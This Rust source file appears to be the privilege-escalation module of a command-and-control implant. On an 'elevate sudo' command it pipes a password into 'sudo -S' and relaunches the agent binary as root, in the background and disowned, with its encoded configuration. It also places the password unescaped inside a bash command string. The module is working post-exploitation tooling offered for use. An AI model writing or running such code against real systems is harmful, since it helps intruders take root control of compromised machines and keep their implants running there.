use std::error::Error;
use sysinfo::{System, SystemExt, UserExt};
use whoami::username;
use crate::config::ConfigOptions;
use std::env::args;
use std::process::Command;

/// Determines whether a session can elevate privileges.
/// 
/// On Windows, uses privileges to determine this.
/// 
/// On Linux, uses membership in `sudo`,
/// 
/// Ain't perfect, but it's a start.
pub fn can_elevate() -> bool {
    
    #[cfg(not(windows))] {
        // Get username and match it against list of users that has data
        let s = System::new_all();
        let username = username();
        let user = s.users()
        .into_iter()
        .filter(|&u| u.name() == username )
        .nth(0)
        .unwrap();
    
        // Uses group membership to determine elevation capabilities
        return user.groups().contains(&"sudo".to_string());
    }

    #[cfg(windows)] {
        false
    }

}

/// Attempts to elevate privileges. If successful, a new session
/// will be opened as the elevated user.
/// 
/// Usage: `elevate [method] [password]`
/// 
/// Because we can't wait for the output of the child process, 
/// we toss the handle.
pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
    if can_elevate() {
        let mut elevate_args = s.split(" ");
        match elevate_args.nth(0).unwrap().trim() {
            "sudo" => {
                let pwd = elevate_args.nth(0).unwrap();
                let encoded_config = config_options.to_base64();
                let agent_path = args().nth(0).unwrap();
                let cmd_string = format!("echo '{pwd}' | sudo -S  {agent_path} -b {encoded_config} & disown");
                Command::new("/bin/bash")
                .arg("-c")
                .arg(cmd_string)
                .spawn()?;
                Ok("Elevation attempted. Look for the new agent!".to_string())
            },
            _ => Ok("Unknown elevation method".to_string())
        }
    } else {
        Ok("Elevation unavailable".to_string())
    }
}